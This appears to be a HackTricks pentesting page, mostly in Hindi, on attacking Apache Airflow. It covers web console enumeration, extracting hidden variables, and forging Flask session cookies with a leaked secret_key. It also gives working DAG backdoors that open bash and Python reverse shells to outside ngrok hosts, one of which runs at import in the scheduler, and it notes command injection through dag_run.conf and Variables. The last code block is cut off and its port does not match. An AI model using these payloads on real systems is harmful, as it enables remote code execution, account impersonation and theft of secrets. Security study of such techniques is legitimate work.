# Apache Airflow Security

{{#include ../../banners/hacktricks-training.md}}

### Basic Information

[**Apache Airflow**](https://airflow.apache.org) **डेटा पाइपलाइनों या वर्कफ़्लो को व्यवस्थित और शेड्यूल करने के लिए एक प्लेटफ़ॉर्म के रूप में कार्य करता है**। डेटा पाइपलाइनों के संदर्भ में "व्यवस्थापन" का अर्थ विभिन्न स्रोतों से उत्पन्न जटिल डेटा वर्कफ़्लो को व्यवस्थित, समन्वयित और प्रबंधित करने की प्रक्रिया है। इन व्यवस्थित डेटा पाइपलाइनों का प्राथमिक उद्देश्य संसाधित और उपभोग करने योग्य डेटा सेट प्रदान करना है। ये डेटा सेट कई अनुप्रयोगों द्वारा व्यापक रूप से उपयोग किए जाते हैं, जिनमें व्यवसायिक बुद्धिमत्ता उपकरण, डेटा विज्ञान और मशीन लर्निंग मॉडल शामिल हैं, जो सभी बड़े डेटा अनुप्रयोगों के कार्य करने के लिए आधारभूत हैं।

बुनियादी रूप से, Apache Airflow आपको **कोड के निष्पादन को शेड्यूल करने की अनुमति देगा जब कुछ** (घटना, क्रोन) **होता है**।

### Local Lab

#### Docker-Compose

आप **docker-compose config file from** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) का उपयोग करके एक पूर्ण apache airflow docker वातावरण लॉन्च कर सकते हैं। (यदि आप MacOS पर हैं, तो सुनिश्चित करें कि आप docker VM को कम से कम 6GB RAM दें)।

#### Minikube

**apache airflo**w को चलाने का एक आसान तरीका है **minikube के साथ इसे चलाना**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow Configuration

Airflow अपनी **संवेदनशील जानकारी** को अपनी कॉन्फ़िगरेशन में स्टोर कर सकता है या आप कमजोर कॉन्फ़िगरेशन पा सकते हैं:

{{#ref}}
airflow-configuration.md
{{#endref}}

### Airflow RBAC

Airflow पर हमला करने से पहले आपको **अनुमतियों का काम कैसे होता है** समझना चाहिए:

{{#ref}}
airflow-rbac.md
{{#endref}}

### Attacks

#### Web Console Enumeration

यदि आपके पास **वेब कंसोल तक पहुंच** है, तो आप निम्नलिखित जानकारी में से कुछ या सभी तक पहुंच सकते हैं:

- **Variables** (कस्टम संवेदनशील जानकारी यहां स्टोर की जा सकती है)
- **Connections** (कस्टम संवेदनशील जानकारी यहां स्टोर की जा सकती है)
- उन्हें `http://<airflow>/connection/list/` में एक्सेस करें
- [**Configuration**](./#airflow-configuration) (संवेदनशील जानकारी जैसे **`secret_key`** और पासवर्ड यहां स्टोर किए जा सकते हैं)
- **users & roles** की सूची
- **Code of each DAG** (जिसमें दिलचस्प जानकारी हो सकती है)

#### Retrieve Variables Values

Variables को Airflow में स्टोर किया जा सकता है ताकि **DAGs** उनके मानों को **एक्सेस** कर सकें। यह अन्य प्लेटफार्मों के रहस्यों के समान है। यदि आपके पास **पर्याप्त अनुमतियाँ** हैं, तो आप उन्हें GUI में `http://<airflow>/variable/list/` में एक्सेस कर सकते हैं।\
Airflow डिफ़ॉल्ट रूप से GUI में वेरिएबल का मान दिखाएगा, हालाँकि, [**इस**](https://marclamberti.com/blog/variables-with-apache-airflow/) के अनुसार, एक **वेरिएबल्स की सूची** सेट करना संभव है जिसका **मान** GUI में **अतिरिक्त चिह्नों** के रूप में दिखाई देगा।

![](<../../images/image (164).png>)

हालांकि, ये **मान** अभी भी **CLI** के माध्यम से **प्राप्त** किए जा सकते हैं (आपको DB एक्सेस होना चाहिए), **मनमाने DAG** निष्पादन, **API** के माध्यम से वेरिएबल्स एंडपॉइंट तक पहुंच (API को सक्रिय करना आवश्यक है), और **यहां तक कि GUI स्वयं!**\
GUI से उन मानों तक पहुंचने के लिए बस **वेरिएबल्स** का चयन करें जिन्हें आप एक्सेस करना चाहते हैं और **Actions -> Export** पर क्लिक करें।\
एक और तरीका है **छिपे हुए मान** पर **ब्रूटफोर्स** करना, इसे **खोज फ़िल्टरिंग** का उपयोग करके जब तक आप इसे प्राप्त न कर लें:

![](<../../images/image (152).png>)

#### Privilege Escalation

यदि **`expose_config`** कॉन्फ़िगरेशन **True** पर सेट है, तो **User** भूमिका और **ऊपर** से **वेब में कॉन्फ़िग** को **पढ़** सकते हैं। इस कॉन्फ़िगरेशन में, **`secret_key`** दिखाई देता है, जिसका अर्थ है कि इस मान्य के साथ कोई भी उपयोगकर्ता **अपना स्वयं का साइन किया हुआ कुकी बना सकता है ताकि किसी अन्य उपयोगकर्ता खाते का अनुकरण कर सके**।
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG बैकडोर (Airflow कार्यकर्ता में RCE)

यदि आपके पास **लिखने की अनुमति** है जहाँ **DAGs सहेजे जाते हैं**, तो आप बस **एक बना सकते हैं** जो आपको एक **रिवर्स शेल** भेजेगा।\
ध्यान दें कि यह रिवर्स शेल एक **airflow कार्यकर्ता कंटेनर** के अंदर निष्पादित होने वाला है:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG बैकडोर (Airflow शेड्यूलर में RCE)

यदि आप कुछ को **कोड की जड़ में निष्पादित करने के लिए सेट करते हैं**, तो इस लेखन के समय, इसे **शेड्यूलर द्वारा निष्पादित किया जाएगा** DAG के फ़ोल्डर में रखने के कुछ सेकंड बाद।
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG निर्माण

यदि आप **DAG क्लस्टर के अंदर एक मशीन को समझौता करने में सफल होते हैं**, तो आप `dags/` फ़ोल्डर में नए **DAGs स्क्रिप्ट** बना सकते हैं और ये **DAG क्लस्टर के अंदर बाकी मशीनों में दोहराए जाएंगे**।

#### DAG कोड इंजेक्शन

जब आप GUI से एक DAG को निष्पादित करते हैं, तो आप इसे **आर्गुमेंट्स** **दे सकते हैं**।\
इसलिए, यदि DAG ठीक से कोडित नहीं है, तो यह **कमांड इंजेक्शन के लिए संवेदनशील हो सकता है।**\
यही इस CVE में हुआ: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

आपको **DAGs में कमांड इंजेक्शन की तलाश शुरू करने के लिए जो कुछ भी जानने की आवश्यकता है, वह यह है कि **पैरामीटर** कोड **`dag_run.conf.get("param_name")`** के साथ **एक्सेस** किए जाते हैं। 

इसके अलावा, वही संवेदनशीलता **वेरिएबल्स** के साथ भी हो सकती है (ध्यान दें कि पर्याप्त विशेषाधिकार के साथ आप GUI में **वेरिएबल्स के मान को नियंत्रित कर सकते हैं**)। वेरिएबल्स को **इससे एक्सेस किया जाता है**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
यदि उन्हें उदाहरण के लिए एक bash कमांड के अंदर उपयोग किया जाता है, तो आप एक कमांड इंजेक्शन कर सकते हैं। 

{{#include ../../banners/hacktricks-training.md}}
